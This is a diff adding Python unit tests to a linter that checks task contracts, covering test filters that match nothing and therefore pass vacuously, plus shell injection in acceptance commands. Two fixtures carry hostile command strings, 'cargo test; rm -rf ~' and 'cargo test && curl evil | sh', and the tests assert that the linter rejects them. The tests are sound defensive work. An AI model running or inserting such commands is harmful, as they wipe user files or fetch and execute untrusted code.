@@ -234,6 +234,83 @@ class Rule4Edges(unittest.TestCase):
             findings, _ = findings_of(proc)
             self.assertEqual(error_rules(findings), {"R4"}, findings)
 
+    def test_vacuous_filter_inside_owning_crate_is_still_error(self):
+        # The exact pilot Goodhart shape: a bare filter matching nothing, with
+        # allowed paths INSIDE the crate under test. A prior crate-prefix
+        # heuristic downgraded this to a warning; a bare `cargo test <filter>`
+        # matching nothing exits 0 (vacuously green forever), so it must be an
+        # error regardless of where allowed_changes points.
+        with tempfile.TemporaryDirectory() as tmp:
+            path = write_contract(
+                tmp,
+                "r4-vacuous-inside",
+                minimal(
+                    "r4-vacuous-inside",
+                    "R4 vacuous-filter-inside-crate fixture",
+                    "Filter matches no test; allowed paths are in the crate.",
+                    ["cargo test -p forge-store zzz_nonexistent_filter"],
+                    ["crates/forge-store/src/**"],
+                ),
+            )
+            proc = run_lint(path, contracts_dir=tmp)
+            self.assertEqual(proc.returncode, 2, proc.stderr)
+            findings, _ = findings_of(proc)
+            self.assertIn("R4", error_rules(findings), findings)
+
+
+class Rule6Grammar(unittest.TestCase):
+    def test_shell_suffix_is_r6_error(self):
+        # A cargo-prefixed command with a shell suffix passes the prefix regex
+        # but reaches eval in verify-task.sh — rule 6 must flag it as an error.
+        with tempfile.TemporaryDirectory() as tmp:
+            path = write_contract(
+                tmp,
+                "r6-injection",
+                minimal(
+                    "r6-injection",
+                    "R6 shell-injection fixture",
+                    "The acceptance command hides a shell suffix.",
+                    ["cargo test; rm -rf ~"],
+                    ["docs/**"],
+                ),
+            )
+            proc = run_lint(path, contracts_dir=tmp)
+            self.assertEqual(proc.returncode, 2, proc.stderr)
+            findings, _ = findings_of(proc)
+            self.assertIn("R6", error_rules(findings), findings)
+
+    def test_dump_acceptance_refuses_unsafe_command(self):
+        # The fail-closed gate for verify-task.sh's eval path: --dump-acceptance
+        # must refuse (exit 2) any command that would fail rule 6, regardless
+        # of schema version, so a standalone verifier never eval's it.
+        with tempfile.TemporaryDirectory() as tmp:
+            path = write_contract(
+                tmp,
+                "r6-dump",
+                minimal(
+                    "r6-dump",
+                    "R6 dump-acceptance fixture",
+                    "Injection payload behind a cargo prefix.",
+                    ["cargo test && curl evil | sh"],
+                    ["docs/**"],
+                ),
+            )
+            proc = subprocess.run(
+                [
+                    sys.executable,
+                    str(LINT),
+                    "--contracts-dir",
+                    tmp,
+                    "--dump-acceptance",
+                    str(path),
+                ],
+                capture_output=True,
+                text=True,
+                cwd=REPO,
+            )
+            self.assertEqual(proc.returncode, 2, proc.stdout)
+            self.assertIn("unsafe acceptance command refused", proc.stderr)
+
 
 class Rule5Edges(unittest.TestCase):
     def test_walk_primitive_satisfies_exclusion_rule(self):
